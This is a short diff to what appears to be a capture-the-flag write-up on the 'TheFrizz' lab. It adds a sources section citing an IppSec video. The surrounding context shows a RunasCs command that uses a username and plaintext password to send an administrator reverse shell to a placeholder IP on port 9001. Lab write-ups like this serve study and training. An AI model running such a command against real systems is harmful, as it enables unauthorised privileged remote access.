@@ -330,3 +330,7 @@ gpupdate /force
 #send yourself a revshell with admin rights:
 .\RunasC.exe "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -r IP:9001
 ```
+
+## Fuentes / Sources
+
+- [IppSec: TheFrizz (video)](https://youtube.com/watch?v=1fCOHQE6A6c) - IppSec - fecha de acceso: 2026-09-24.
